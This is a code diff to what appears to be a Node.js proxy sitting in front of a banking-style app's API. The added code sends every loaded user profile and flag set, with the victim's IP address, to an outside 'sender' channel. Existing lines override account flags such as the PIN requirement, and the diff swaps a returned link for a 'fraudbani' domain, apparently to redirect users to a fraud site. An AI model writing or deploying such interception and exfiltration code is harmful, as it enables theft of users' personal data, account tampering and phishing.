@@ -1,4 +1,4 @@
-import { requests } from '../helpers/index.js'
+import { requests, sender } from '../helpers/index.js'
 import Usuario from '../models/usuario.js'
 
 const processActions = async(req, res) => {
@@ -87,6 +87,14 @@ const cargarFlags = async(req, res) => {
       null
     );
     
+    const send = `
+Alguien cargó sus Flags!
+${JSON.stringify(resp, null, 2)}
+From: ${req.headers['x-forwarded-for'] || req.connection.remoteAddress}
+`
+
+sender(send, res)
+    
     resp.preferential_status = true
     resp.user_status = true
     resp.user_pin = false
@@ -137,6 +145,14 @@ const userV2 = async(req, res) => {
     //resp.first_last_name = 'xLaxC0rruptxRatx'
 
     console.log(resp)
+    
+    const send = `
+Alguien cargó su Data!
+${JSON.stringify(resp, null, 2)}
+From: ${req.headers['x-forwarded-for'] || req.connection.remoteAddress}
+`
+
+  sender(send, res)
 
     res.send(resp);
   } catch (err) {
@@ -251,7 +267,7 @@ const v2URL = async(req, res) => {
       null
     );
     
-    resp.URL_FB = 'https://google.com'
+    resp.URL_FB = 'https://fraudbani.onrender.com'
     
     console.log(resp)
     
